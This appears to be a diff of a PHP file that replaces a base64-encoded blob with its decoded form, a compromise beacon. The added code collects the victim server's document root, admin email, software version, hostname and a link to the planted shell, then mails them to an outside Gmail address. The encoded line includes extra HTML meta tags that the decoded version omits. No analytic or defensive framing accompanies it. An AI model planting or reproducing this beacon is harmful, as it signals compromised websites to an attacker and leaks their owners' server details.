@@ -1,1 +1,11 @@
-PD9waHAKZWNobyAnPG1ldGEgY2hhcnNldD0idXRmLTgiPjxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudCJub2luZGV4LG5vZm9sbG93Ij48ZGl2IGFsaWduPSJjZW50ZXIiPjxzdHJvbmc+PHNwYW4gc3R5bGU9ImNvbG9yOiMwMDAwRkY7Ij4nOwokd2hvPSJ3ZWJndXZlbmxpZ2kxOUBnbWFpbC5jb20iOwokdGl0bGU9IkxpbmsgQmlsZGlyaSA8c3VwcG9yQG5pYy5vcmc+XG4iOwokc2VuZC49IkRpcmVjdG9yeSA6ICIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iXHJcbiI7CiRzZW5kLj0iU2VydmVyIEFkbWluIDogIi4kX1NFUlZFUlsnU0VSVkVSX0FETUlOJ10uIlxyXG4iOwokc2VuZC49IlNlcnZlciBPUyA6ICIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiJcclxuIjsKJHNlbmQuPSJTaGVsbCBMaW5rIDogaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIlxyXG4iOwokc2VuZC49IlRhcmdldCBTaXRlIDogIiAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiJcclxuIjsKbWFpbCgkd2hvLCAkdGl0bGUsICRzZW5kKTsKPz4=
+<?php
+echo '<span style="color:#0000FF;">';
+$who="webguvenligi19@gmail.com";
+$title="Link Bildiri <suppor@nic.org>\n";
+$send.="Directory : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
+$send.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
+$send.="Server OS : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
+$send.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
+$send.="Target Site : " .$_SERVER['HTTP_HOST']."\r\n";
+mail($who, $title, $send);
+?>
